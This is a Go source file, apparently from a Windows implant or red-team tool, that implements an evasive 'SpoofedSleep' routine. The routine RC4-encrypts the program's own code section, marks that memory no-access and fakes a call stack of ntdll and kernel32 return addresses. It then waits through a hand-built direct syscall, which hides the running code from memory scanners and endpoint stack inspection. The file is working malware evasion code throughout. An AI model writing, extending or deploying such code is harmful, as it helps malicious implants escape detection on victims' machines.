//go:build windows && amd64

package winsyscall

import (
	"encoding/binary"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// SpoofedSleep performs a full stack-spoofed encrypted sleep of duration d.
//
// Combines three techniques:
//  1. RC4-encrypt .text via SystemFunction032 so bytes at sleeping-thread
//     frames contain cipher garbage, not recognisable opcodes.
//  2. PAGE_NOACCESS — flip .text so external stack walkers get an access
//     violation trying to read the frame at [RSP+0].
//  3. Synthetic call stack — asmSpoofedWait swaps RSP to a buffer containing
//     well-known ntdll/kernel32 return addresses before issuing
//     NtWaitForSingleObject, so frames 1+ look like a normal thread-pool wait.
func SpoofedSleep(d time.Duration) {
	base, size := selfTextRegion()
	if base == 0 || size == 0 {
		NtDelay(d)
		return
	}

	rtlFrame, k32Frame := spoofFrameAddrs()
	if rtlFrame == 0 || k32Frame == 0 {
		NtDelay(d)
		return
	}

	// Build the fake call stack buffer.
	const fakeStackSize = 256
	const rspOff = 64
	fakeBuf := make([]byte, fakeStackSize)
	binary.LittleEndian.PutUint64(fakeBuf[rspOff:], uint64(rtlFrame))
	binary.LittleEndian.PutUint64(fakeBuf[rspOff+8:], uint64(k32Frame))
	binary.LittleEndian.PutUint64(fakeBuf[rspOff+16:], 0)
	fakeRSP := uintptr(unsafe.Pointer(&fakeBuf[rspOff]))

	// Build NtWaitForSingleObject direct-syscall stub (separate VirtualAlloc,
	// NOT inside .text — so the stub stays executable while .text is NOACCESS).
	ssn, err := hgGetSSN("NtWaitForSingleObject")
	if err != nil {
		NtDelay(d)
		return
	}
	waitStub, freeStub, err := hgMakeStub(ssn)
	if err != nil {
		NtDelay(d)
		return
	}
	defer freeStub()

	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		NtDelay(d)
		return
	}
	defer windows.CloseHandle(hEvent)

	var pin runtime.Pinner
	pin.Pin(&fakeBuf[0])
	defer pin.Unpin()

	// RC4-encrypt .text region.
	rc4Key := makeRC4Key(base, d)
	rc4KeySlice := rc4Key[:]
	regionKey := UString{
		Length:        uint16(len(rc4KeySlice)),
		MaximumLength: uint16(len(rc4KeySlice)),
		Buffer:        uintptr(unsafe.Pointer(&rc4KeySlice[0])),
	}
	regionData := UString{
		Length:        uint16(size),
		MaximumLength: uint16(size),
		Buffer:        base,
	}

	// Flip .text to RW, encrypt, flip to NOACCESS.
	origProtect, err := NtProtectSelf(base, size, PageReadWrite)
	if err != nil {
		NtDelay(d)
		return
	}
	ProcSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)
	if _, err := NtProtectSelf(base, size, PageNoAccess); err != nil {
		NtProtectSelf(base, size, origProtect) //nolint:errcheck
		NtDelay(d)
		return
	}

	// Helper goroutine: sleep d, restore .text, signal.
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		NtDelay(d)

		NtProtectSelf(base, size, PageReadWrite) //nolint:errcheck
		ProcSystemFunction032.Call(
			uintptr(unsafe.Pointer(&regionData)),
			uintptr(unsafe.Pointer(&regionKey)),
		)
		NtProtectSelf(base, size, origProtect) //nolint:errcheck

		windows.SetEvent(hEvent) //nolint:errcheck
	}()

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	asmSpoofedWait(uintptr(hEvent), fakeRSP, waitStub)
}

// spoofFrameAddrs resolves the synthetic return addresses used to populate the
// fake call stack.
func spoofFrameAddrs() (rtlUserThreadStart, baseThreadInitThunk uintptr) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	rts := ntdll.NewProc("RtlUserThreadStart")
	bit := k32.NewProc("BaseThreadInitThunk")
	if rts.Find() != nil || bit.Find() != nil {
		return 0, 0
	}
	return rts.Addr() + 0x21, bit.Addr() + 0x14
}

// asmSpoofedWait is implemented in stackspoof_amd64.s.
//
//go:nosplit
func asmSpoofedWait(hEvent, fakeRSP, waitStub uintptr)
